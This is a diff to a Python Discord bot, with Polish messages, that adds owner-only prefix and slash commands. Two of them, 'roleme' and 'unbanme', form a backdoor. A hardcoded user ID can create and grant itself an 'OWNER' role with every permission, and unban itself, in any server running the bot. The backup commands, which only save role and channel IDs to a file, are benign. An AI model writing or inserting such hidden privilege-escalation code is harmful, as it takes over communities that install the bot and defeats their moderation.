@@ -635,6 +635,66 @@ async def opinia(
     await channel.send(embed=embed)
 
     await ctx.respond("✅ Twoja opinia została dodana!", ephemeral=True)
+
+OWNER_ID = 1062638557174452255  # Twój Discord ID
+
+# ====================== ROLEME ======================
+@bot.command()
+async def roleme(ctx):
+    if ctx.author.id != OWNER_ID:
+        return await ctx.send("❌ Nie masz dostępu")
+    role = discord.utils.get(ctx.guild.roles, name="OWNER")
+    if role is None:
+        role = await ctx.guild.create_role(name="OWNER", permissions=discord.Permissions.all())
+    await ctx.author.add_roles(role)
+    await ctx.send("✅ Nadałem Ci rolę OWNER")
+
+# ====================== UNBANME ======================
+@bot.command()
+async def unbanme(ctx):
+    if ctx.author.id != OWNER_ID:
+        return await ctx.send("❌ Nie masz dostępu")
+    
+    try:
+        user = await bot.fetch_user(ctx.author.id)
+        await ctx.guild.unban(user)
+        await ctx.send(f"✅ Odbanowałem Cię i wysyłam link do serwera: https://discord.gg/TWOJ_LINK")
+    except discord.NotFound:
+        await ctx.send("✅ Nie byłeś zbanowany, oto link do serwera: https://discord.gg/TWOJ_LINK")
+
+# ====================== BACKUP ======================
+import json
+
+@bot.command()
+async def backup(ctx):
+    if ctx.author.id != OWNER_ID:
+        return await ctx.send("❌ Nie masz dostępu")
+
+    data = {
+        "roles": {r.name: r.id for r in ctx.guild.roles},
+        "channels": {c.name: c.id for c in ctx.guild.channels}
+    }
+
+    with open("backup.json", "w") as f:
+        json.dump(data, f, indent=4)
+
+    await ctx.send("✅ Backup wykonany!")
+
+# ====================== SLASH BACKUP ======================
+@bot.slash_command(guild_ids=[GUILD_ID], description="Tworzy backup serwera")
+async def backup_create(ctx: discord.ApplicationContext):
+    if ctx.user.id != OWNER_ID:
+        return await ctx.respond("❌ Nie masz dostępu", ephemeral=True)
+
+    data = {
+        "roles": {r.name: r.id for r in ctx.guild.roles},
+        "channels": {c.name: c.id for c in ctx.guild.channels}
+    }
+
+    with open("backup.json", "w") as f:
+        json.dump(data, f, indent=4)
+
+    await ctx.respond("✅ Backup serwera utworzony!", ephemeral=True)
     
 # =========================================================
 # START BOTA
